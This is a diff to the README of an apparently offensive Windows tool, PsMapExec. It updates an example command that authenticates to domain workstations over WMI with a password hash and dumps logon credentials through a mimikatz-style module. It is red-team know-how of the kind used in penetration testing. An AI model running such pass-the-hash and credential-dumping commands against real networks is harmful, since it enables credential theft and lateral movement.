@@ -48,7 +48,7 @@ PsMapExec -Targets Servers -Username Admin -Password Pass -Method WinRM -Module 
 \
 Authenticate over WMI with a hash and execute mimikatz
 ```
-PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module Mimikatz -Option Parse
+PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module LogonPasswords -Option Parse -ShowOutput
 ```
 \
 Check SMB Signing on all domain systems
